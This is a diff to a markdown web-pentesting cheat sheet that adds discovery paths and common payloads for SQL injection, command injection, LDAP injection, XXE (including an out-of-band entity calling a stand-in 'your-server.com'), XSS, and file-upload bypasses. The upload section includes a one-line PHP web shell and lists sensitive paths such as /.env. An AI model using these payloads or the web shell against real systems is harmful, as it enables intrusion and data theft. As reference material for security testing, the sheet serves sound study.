@@ -2,13 +2,14 @@
 
 ## 1.1 SQL Injection(SQLi) :
 
-Inject malicious SQL queries to access, modify, or delete database data. Injection path finding:
+Inject malicious SQL queries to access, modify, or delete database data.  
+**Discovery Path** :
 
 - URL Parameters (?id=1)
 - Form Fields (login,search,contact forms)
 - HTTP Header (User-Agent, Referer)
 
-Common payloads :
+**Common payload** :
 
 - basic ( `?id=1' --` , `?id=1' AND '1'='1` )
 - Error based ( `?id=1"` , `?id=1 AND 1=CONVERT(int, (SELECT @@version))` )
@@ -19,14 +20,15 @@ Common payloads :
 
 ## 1.2 Command Injection :
 
-Execute arbitrary system-level commands on the server. Look for input fields or URLs that interact with system-level commands, such as:
+Execute arbitrary system-level commands on the server. Look for input fields or URLs that interact with system-level commands.  
+**Discovery Path** :
 
 - Search Box
 - Ping/Traceroute utilities
 - File upload/rename/delete functions
 - URL Parameters like: ( ?host=, ?ip=, ?cmd=, ?target= )
 
-Common payload :
+**Common payload** :
 
 - linux ( `127.0.0.1; whoami` )
 - window ( `127.0.0.1 && whoami` )
@@ -36,13 +38,14 @@ Common payload :
 
 ## 1.3 LDAP Injection :
 
-Manipulate LDAP queries to bypass authentication or access data. Look for :
+Manipulate LDAP queries to bypass authentication or access data.  
+**Discovery Path** :
 
 - Search fields (e.g., employee name, email, department)
 - Login or lookup functions
 - URLParameters like: ( username=, filter=, search= )
 
-Common Payload :
+**Common Payload** :
 
 - Always true ( `admin*)(&)` )
 - Add new one ( `*)(uid=*)` )
@@ -50,15 +53,17 @@ Common Payload :
 
 ## 1.4 XML External Entity (XXE) :
 
-Exploit XML parsers to disclose internal files or SSRF attacks. For XXE attack:
+Exploit XML parsers to disclose internal files or SSRF attacks.  
+**Discovery Path**:
 
 - Capture a POST request with XML data.
 - Add the XXE payload in the body.
 - Forward and monitor the response or OOB DNS logs.
 
-Common Payload :
+**Common Payload**:
 
 - In-Bind attack <pre> `xml <?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE foo [ <!ELEMENT foo ANY > <!ENTITY xxe SYSTEM "file:///etc/passwd" >]> <user> <name>&xxe;</name> </user> ` </pre>
+- Out-of-Bind Attack <pre> `<?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE foo [ <!ELEMENT foo ANY > <!ENTITY xxe SYSTEM "http://your-server.com/xxe.txt" >]> <user> <name>&xxe;</name> </user> ` </pre>
 
 ---
 
@@ -66,15 +71,51 @@ Common Payload :
 
 ## 2.1 Broken Authentication :
 
-Exploit weak login mechanisms to gain unauthorized access (e.g., password brute-force, logic flaws).
+Exploit weak or flawed authentication mechanisms to gain unauthorized access.  
+**Discovery Path**:
+
+- Login endpoints with username and password
+- Password reset or forgot password forms
+- Session management (tokens, cookies)
+
+**Common Payloads / Techniques**:
+
+- Brute-force login using wordlists (`admin:admin`, `user:123456`)
+- Bypass logic flaws (e.g., send only username, empty password)
+- Replay expired or predictable session tokens
+- Use default credentials (admin/admin)
 
 ## 2.2 Broken Access Control :
 
-Access resources or actions without proper permissions (e.g., IDOR, privilege escalation).
+Access resources or perform actions that should be restricted.  
+**Discovery Path**:
+
+- Endpoints that return user-specific data (`/user?id=123`)
+- Admin-only or role-specific panels (`/admin`, `/config`)
+- Hidden UI elements (inspect via browser DevTools)
+
+**Common Payloads / Techniques**:
+
+- IDOR test: change `user_id=1` to `user_id=2` in URLs or POST data
+- Manually access `/admin`, `/manage/users` without proper role
+- Remove or modify `isAdmin=false` in requests
+- Use Burp’s “Parameter Pollution” to escalate permissions
 
 ## 2.3 Account Takeover (ATO) :
 
-Gain control over another user’s account using insecure flows or token manipulation.
+Gain control of another user's account via insecure flows.  
+**Discovery Path**:
+
+- Weak or predictable password reset tokens
+- Email or phone change features
+- Insecure OAuth or 2FA implementations
+
+**Common Payloads / Techniques**:
+
+- Capture and reuse password reset link from intercepted email
+- Bruteforce or guess token values (`/reset?token=1234`)
+- Change email to attacker’s without re-authentication
+- Session fixation: login a victim to attacker’s session
 
 ---
 
@@ -82,15 +123,49 @@ Gain control over another user’s account using insecure flows or token manipul
 
 ## 3.1 Reflected XSS :
 
-Payload is reflected and executed immediately via URL or form.
+Malicious script is reflected in the response and executed immediately.  
+**Discovery Path**:
+
+- URL parameters (`?q=`, `?search=`)
+- GET or POST form inputs
+- Error messages or status alerts
+
+**Common Payloads**:
+
+- `<script>alert(1)</script>`
+- `<img src=x onerror=alert(1)>`
+- `<svg/onload=alert(1)>`
+- `"><script>alert(document.domain)</script>`
+- `<iframe src="javascript:alert(1)">`
 
 ## 3.2 Stored XSS :
 
-Malicious script is saved on the server and triggered for every user.
+Malicious input is permanently stored on the server and executed when viewed.  
+**Discovery Path**:
+
+- Comment sections
+- Profile bio / About Me
+- Chat systems, forums, admin dashboards
+
+**Common Payloads**:
+
+- `<script>alert('StoredXSS')</script>`
+- `<img src=x onerror=confirm('XSS')>`
+- `<svg><animate onbegin=alert(1) attributeName=x dur=1s>`
 
 ## 3.3 DOM-Based XSS :
 
-Client-side JS processes untrusted input and executes it dynamically.
+Client-side JavaScript dynamically injects or executes unsanitized input.  
+**Discovery Path**:
+
+- Look for JS handling of `location.hash`, `document.URL`, `location.search`
+- Interact with URL fragments (`#name=evil`) or parameters
+
+**Common Payloads**:
+
+- `#<img src=x onerror=alert(1)>`
+- `?input=<svg/onload=alert(1)>`
+- `<a href="/page#"><script>alert(1)</script></a>`
 
 ---
 
@@ -98,15 +173,50 @@ Client-side JS processes untrusted input and executes it dynamically.
 
 ## 4.1 Sensitive Data Exposure :
 
-Access to PII, passwords, tokens, or internal system info due to poor handling.
+Improper handling of sensitive information such as credentials, tokens, or PII.  
+**Discovery Path**:
+
+- API responses revealing sensitive info
+- Tokens stored in `localStorage` / `sessionStorage`
+- Exposed `.env`, `.bak`, `.git`, or config files
+- HTTP (insecure) instead of HTTPS
+
+**Common Findings**:
+
+- Hardcoded API keys or secrets in frontend JS
+- JWTs without `exp` (expiry) or weak signing
+- Plaintext passwords in responses or logs
+- Base64 encoded sensitive data (check and decode)
 
 ## 4.2 Server Error Messages :
 
-Server leaks technology stacks, database errors, or internal paths in error responses.
+Verbose error responses leak backend internals.  
+**Discovery Path**:
+
+- Trigger input validation or type conversion errors
+- Use special characters like `'`, `"`, `<`, `{{}}`, `}}`, `[]`
+
+**Common Payloads / Examples**:
+
+- `'` → SQL error trace (e.g., `You have an error in your SQL syntax`)
+- `<%` or `{{` → Template injection errors (e.g., Mustache, Handlebars)
+- Full stack trace showing file paths, version numbers, or DB queries
 
 ## 4.3 Source Code Disclosure :
 
-Accidental leaks of .git, backup files, or source files on the server.
+Accidental exposure of source code or sensitive project files.  
+**Discovery Path**:
+
+- Access backup or temp files (`index.php~`, `config.bak`)
+- Access open directories or version control folders
+- Fuzz file extensions using wordlists or tools like `feroxbuster`, `dirsearch`
+
+**Common Payloads / Paths**:
+
+- `/.git/config`
+- `/backup.zip`, `/db.sql`
+- `/config.old`, `/admin.bak`
+- `/.env` (contains credentials)
 
 ---
 
@@ -114,11 +224,39 @@ Accidental leaks of .git, backup files, or source files on the server.
 
 ## 5.1 Unrestricted File Upload :
 
-Upload dangerous files (e.g., web shells) due to poor validation
+Improper file validation allows attackers to upload malicious files (e.g., shells, scripts).  
+**Discovery Path**:
+
+- Profile picture uploads
+- Document upload features (resume, PDF, etc.)
+- Support ticket systems with attachments
+- Web-based file managers
+
+**Common Payloads**:
+
+- PHP Web Shell: `<?php system($_GET['cmd']); ?>` saved as `shell.php`
+- Double extension: `shell.php.jpg`, `exploit.jpg.php`
+- Rename file via Burp and remove validation: `shell.php` ➝ Content-Type: `image/jpeg`
+
+**Test**:
+
+- Upload file and access via `https://target.com/uploads/shell.php`
+- If blocked, try changing headers or file extension
 
 ## 5.2 Content-Type Bypass :
 
-Upload files by spoofing MIME types or extensions (e.g., image.php.jpg).
+Bypass MIME-type or content-type filters used to restrict dangerous file types.  
+**Discovery Path**:
+
+- Intercept file upload in Burp
+- Change `Content-Type`, `filename`, and `extension`
+- Test with multiple upload points
+
+**Common Payloads**:
+
+- Change `Content-Type: image/png` while sending PHP script
+- Filename tricks: `file.php.jpg`, `file.ph%00p`, `file.PHP`
+- Upload .htaccess to allow execution:
 
 ---
 
@@ -227,11 +365,3 @@ Brute-force login, password reset, or OTP endpoints without being blocked.
 ## 14.2 Resource Exhaustion :
 
 Crash or slow down the app by sending huge payloads or excessive requests.
-
-```
-
-```
-
-```
-
-```
